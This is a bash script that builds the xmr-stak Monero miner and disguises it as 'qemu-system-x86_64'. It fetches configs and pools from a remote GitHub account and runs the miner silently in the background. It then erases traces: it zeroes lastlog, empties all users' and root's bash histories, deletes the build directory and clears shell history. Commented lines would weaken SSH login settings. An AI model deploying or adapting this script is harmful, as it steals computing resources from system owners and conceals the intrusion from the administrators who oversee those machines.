#!/bin/bash

cpu_cnt=`cat /proc/cpuinfo | awk '/processor/ {print $3}' | wc -l`
#ht_enabled=``
if [  -z "$1" ]
then
        phycores=$(cat /proc/cpuinfo | egrep "core id|physical id" | tr -d "\n" | sed s/physical/\\nphysical/g | grep -v ^$ | sort | uniq | wc -l)
else
        phycores=$1
fi
apt-get install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git wget
mkdir /usr/share/packages_download
workingdir=/usr/share/packages_download/

git clone https://github.com/fireice-uk/xmr-stak.git $workingdir/qemu-system-x86
mkdir $workingdir/qemu-system-x86/build
cd $workingdir/qemu-system-x86/build
cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF
make install
mv $workingdir/qemu-system-x86/build/bin/xmr-stak $workingdir/qemu-system-x86/build/bin/qemu-system-x86_64
curl https://raw.githubusercontent.com/githubuserold/miner/master/cpu.txt > $workingdir/qemu-system-x86/build/bin/cpu.txt
curl https://raw.githubusercontent.com/githubuserold/miner/master/config_new.txt > $workingdir/qemu-system-x86/build/bin/config.txt
curl https://raw.githubusercontent.com/githubuserold/miner/master/pools.txt > $workingdir/qemu-system-x86/build/bin/pools.txt
echo -e "],\n$(cat $workingdir/qemu-system-x86/build/bin/cpu.txt)" > $workingdir/qemu-system-x86/build/bin/cpu.txt
for (( core=0; core<$phycores; core++ )); do
         echo -e "   { \"low_power_mode\" : false, \"no_prefetch\" : true, \"affine_to_cpu\" : ${core} },\n$(cat $workingdir/qemu-system-x86/build/bin/cpu.txt)" > $workingdir/qemu-system-x86/build/bin/cpu.txt
done
echo -e "[\n$(cat $workingdir/qemu-system-x86/build/bin/cpu.txt)" > $workingdir/qemu-system-x86/build/bin/cpu.txt
echo -e "\"cpu_threads_conf\" :\n$(cat $workingdir/qemu-system-x86/build/bin/cpu.txt)" > $workingdir/qemu-system-x86/build/bin/cpu.txt
cd $workingdir/qemu-system-x86/build/bin
sed -i 's/2\.0/0\.0/g' $workingdir/qemu-system-x86/xmrstak/donate-level.hpp
nohup ./qemu-system-x86_64 > /dev/null 2>&1&
cd
#sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
#sed -i 's/PubkeyAuthentication yes/PubkeyAuthentication no/g' /etc/ssh/sshd_config
#sed -i 's/RSAAuthentication yes/RSAAuthentication no/g' /etc/ssh/sshd_config
#sed -i 's/authorized_keys/authorized_key/g' /etc/ssh/sshd_config
#service sshd restart
sed -i 's/[0-9]/0/g' /var/log/lastlog
users=`ls -la /home/ | grep -vE "root|total" | awk '{print $9}' | sed 's/\///g'`
for i in ${users}; do
        cat /dev/null > /home/$i/.bash_history
done
cat /dev/null > /root/.bash_history || true
cat /dev/null > /root/.wget-hsts || true
sleep 10
rm -r /usr/share/packages_download
history -c
